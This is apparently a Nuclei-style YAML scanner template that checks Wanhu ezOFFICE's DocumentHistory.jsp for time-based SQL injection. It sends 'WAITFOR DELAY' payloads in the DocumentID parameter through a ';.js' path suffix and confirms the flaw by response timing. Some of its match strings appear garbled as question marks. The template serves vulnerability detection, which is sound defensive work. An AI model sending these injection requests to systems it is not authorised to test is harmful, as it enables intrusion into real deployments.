id: poc-yaml-whir-ezoffice-documenthistory-sqli
info:
  name: "万户 ezOFFICE DocumentHistory SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 万户ezOFFICE

flow: |
  http(1) && http(2)

http:
  - id: check-redirect
    method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: header
        words:
          - "/defaultroot"

  - id: sqli-document-history
    method: GET
    path:
      - "{{BaseURL}}/defaultroot/public/iSignatureHTML.jsp/DocumentHistory.jsp;.js?DocumentID=1%27%20WAITFOR%20DELAY%20%270:0:5%27--"
      - "{{BaseURL}}/defaultroot/public/iSignatureHTML.jsp/DocumentHistory.jsp;.js?DocumentID=1%27%20WAITFOR%20DELAY%20%270:0:8%27--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "iSignature"
          - "??????"
          - "TDTitleStyle"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
